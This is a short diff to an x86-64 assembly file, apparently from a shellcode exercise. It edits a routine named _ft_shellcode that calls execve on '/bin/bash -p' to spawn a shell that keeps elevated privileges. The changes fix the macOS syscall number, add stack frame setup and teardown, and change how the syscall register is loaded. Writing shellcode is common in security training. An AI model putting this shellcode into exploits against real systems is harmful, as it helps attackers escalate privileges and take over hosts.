@@ -3,7 +3,7 @@
 	%define SYS_EXECVE 0x3b
 %else
 	%define NAME _ft_shellcode
-			SYS_EXECVE 0x2000059
+	%define SYS_EXECVE 0x2000000 | 59
 %endif
 
 ;execve(/bin/bash -p
@@ -11,7 +11,13 @@ section .text
 global NAME 
 
 NAME:
+	push rbp
+	mov rbp, rsp
+	sub rsp, 64
 	xor rax, rax
+	push rax
+	push rax
+	push rax
 	push rax
 	push 0x702d
 	mov rcx, rsp ; addr of "-p"
@@ -24,7 +30,9 @@ NAME:
 	push rcx
 	push rdi
 	mov rsi, rsp
-	mov al, SYS_EXECVE
+	xor rax, rax
+	mov rax, SYS_EXECVE
 	xor rdx, rdx
 	syscall
-
+	leave
+	ret
